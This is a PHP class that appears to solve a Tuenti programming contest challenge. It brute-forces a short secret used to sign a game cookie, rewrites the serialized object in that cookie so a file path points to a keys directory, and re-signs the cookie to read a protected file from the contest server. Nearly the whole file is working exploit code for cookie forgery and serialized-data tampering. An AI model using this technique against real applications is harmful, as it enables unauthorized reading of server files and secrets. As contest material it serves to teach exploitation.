<?php
/**
 * @author Jose Lorente Martin
 */
class KeyFinder
{    
    protected $object;
   
    protected $hash;
    
    protected $key;
    
    protected $secret;
    
    public function __construct($key)
    {
        $this->key = $key;
        
        $this->init();
    }

    protected function init()
    {
        $ch = curl_init('http://ttt.contest.tuenti.net/?new=1');
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec($ch);
        
        $result = array();
        preg_match('/^Set-Cookie:\s*([^;]*)/mi', $response, $result);
        parse_str($result[1], $cookies);
        
        list ($this->object, $this->hash) = explode('|', $cookies['game']);
    }
    
    protected function findSecret($remaining = 4, $set = array('T','U','E','N','T','I'), $permutation = '')
    {
        if ($remaining <= 0) {
            if (md5($this->object . $permutation) === $this->hash) {
                $this->secret = $permutation;
                return true;
            }
            return false;
        } else {
            foreach ($set as $key => $element) {
                $setCopy = $set;
                unset($setCopy[$key]);

                if ($this->findSecret($remaining - 1, $setCopy, $permutation . $element) === true) {
                    return true;
                }
            }
        }
    }
    
    public function getKey()
    {
        $this->findSecret();
        
        $object = base64_decode($this->object);

        $myPath = '/home/ttt/data/keys/' . $this->key;
        $object = str_replace('s:35:"/home/ttt/data/messages/version.txt";', serialize($myPath), $object);
        
        $object = base64_encode($object);
        $cookie = $object.'|'.md5($object . $this->secret);
        
        $ch = curl_init('http://ttt.contest.tuenti.net/?');
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_COOKIE, 'game='.$cookie);
        $response = curl_exec($ch);
        preg_match('/^Set-Cookie: X-Tuenti-Powered-By=\s*([^;]*)/mi', $response, $result);
        
        return $result[1];
    }
}